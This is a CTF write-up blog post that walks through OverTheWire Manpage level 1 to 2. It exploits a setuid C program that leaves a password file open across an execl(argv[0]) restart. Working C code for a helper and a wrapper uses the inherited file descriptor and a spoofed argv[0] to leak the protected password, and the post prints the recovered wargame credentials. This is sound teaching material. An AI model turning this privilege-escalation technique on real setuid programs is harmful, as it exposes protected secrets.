---
date: 2023-10-07 00:00:00 +0700
layout: post-with-comments
title: "OverTheWire Manpage Level 1 → 2 tutorial!!"
permalink: /posts/overTheWire-Manpage-Level-1-to-2/
tags: [overthewire, manpage, walkthrough, ctf, linux]
description: "A step by step tutorial for OverTheWire Manpage Level 1 → 2!!"
---

<!-- Scoped styles: only affect this post -->

<style>
  .manpage-nav{display:flex;align-items:center;gap:.75rem;margin:.5rem 0 1.25rem;border-top:1px solid var(--border-color,#3a3a3a);padding-top:.75rem}
  .manpage-nav .nav-left,.manpage-nav .nav-center,.manpage-nav .nav-right{flex:1}
  .manpage-nav .nav-left{text-align:left}
  .manpage-nav .nav-center{text-align:center}
  .manpage-nav .nav-right{text-align:right}
  .manpage-nav a{display:inline-block;padding:.45rem .8rem;border:1px solid var(--border-color,#3a3a3a);border-radius:.6rem;text-decoration:none;line-height:1}
  .manpage-nav a:hover{transform:translateY(-1px)}
  .manpage-nav .disabled{opacity:.55}
  :root[data-theme='light'] .manpage-nav a{border-color:rgba(0,0,0,.15)}
</style>

<nav class="manpage-nav" aria-label="Manpage level navigation">
  <div class="nav-left">
    <a href="{{ '/posts/overTheWire-Manpage-Level-0-to-1/' | relative_url }}">← Previous: Level 0 → 1</a>
  </div>

  <div class="nav-center">
    <a href="https://overthewire.org/wargames/manpage/manpage2.html" target="_blank" rel="noopener">Official (Level 2) ↗</a>
  </div>

  <div class="nav-right">
    <a href="{{ '/posts/overTheWire-Manpage-Level-2-to-3/' | relative_url }}">Next: Level 2 → 3 →</a>
  </div>
</nav>

## Login

Use the **manpage1** account from the previous level.

```bash
ssh manpage1@manpage.labs.overthewire.org -p 2224
# password: febiukovie
```

---

## Goal

The binary checks the password against `/etc/manpage_pass/manpage3`. If the check fails, it drops privileges and **restarts itself** with `execl(argv[0], ...)`. The bug: it never closes the opened file before restarting. Our goal is to exploit this and read the password from the still‑open file descriptor.

## Given program

```c
#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <unistd.h>
#include <string.h>
#include <stdlib.h>

#define PWFILE "/etc/manpage_pass/manpage3"

int main(int argc, char *argv[])
{
    FILE *f;
    char *p;
    char pass[32];
    char buf[2];

    f = fopen(PWFILE, "r");
    fgets(pass, sizeof pass, f);
    pass[strlen(pass)-1] = '\0';

    p = getpass("password: ");

    if(!strcmp(p, pass)) {
        system("sh");
        exit(0);
    }

    setuid(getuid());

    if(!argv[1]) {
        argv[1] = buf;
        buf[0] = '\0';
    }

    if(argv[1][0]++ >= 2) exit(0);

    argv[1][1] = '\0';
    execl(argv[0], argv[0], argv[1], 0);
    return 0;
}
```

## Approach

1. Notice the **file is never closed**, so the file descriptor is inherited by the next process.
2. The restart executes `argv[0]`. If we control `argv[0]`, we can make it execute our **helper binary**.
3. That helper binary can read fd `3` (stdin=0, stdout=1, stderr=2 → next fd is 3) to extract the password.

## Helper: read password from fd 3

```c
// pwn.c
#include <fcntl.h>
#include <unistd.h>
#include <sys/stat.h>
#include <string.h>
#include <stdlib.h>
#include <stdio.h>

int main(){
    char pass[32];
    if(lseek(3, 0, SEEK_SET) == -1){ puts("lseek error"); return -1; }
    if(read(3, pass, sizeof(pass)) == -1){ puts("read error"); return -1; }
    pass[strlen(pass)-1] = '\0';
    printf("Got the password %s\n", pass);
}
```

## Wrapper: run target with `argv[0] = ./pwn`

```c
// wrap.c
#include <unistd.h>
#include <signal.h>
#include <string.h>

int main(){
    char* argv[] = {"./pwn", NULL};
    char* envp[] = { NULL };
    execve("/manpage/manpage2", argv, envp);
    return 0;
}
```

## Exploit Steps

```bash
cc -o pwn pwn.c
cc -o wrap wrap.c

./wrap
# When prompted for "password:", type anything
# Program fails, restarts, executes ./pwn which inherits fd 3 and prints password
```

Output:

```
Got the password ailaifeipu
```

Now we can use this password to SSH into the next level.

### Why this works

* File descriptors remain open across `exec` unless explicitly closed.
* The program calls `execl(argv[0], ...)`. Since we force `argv[0] = ./pwn`, it runs our helper instead.
* Our helper seeks and reads fd 3 to extract the secret.

## Troubleshooting quick tips

* Ensure `./pwn` exists and is executable in the working directory.
* Trigger the failure path by entering a wrong password once.
* Use `strace -f ./wrap` to confirm fd 3 is inherited if nothing prints.

---

**Congrats 🎉** You’re now through **Level 1 → 2** — time to keep going for **Level 2 → 3**!

---

## Thanks for reading!

Until next time — **Otsumachi!!** 💖☄️✨

![Cinema]({{ '/assets/images/advice/cinema.gif' | relative_url }})
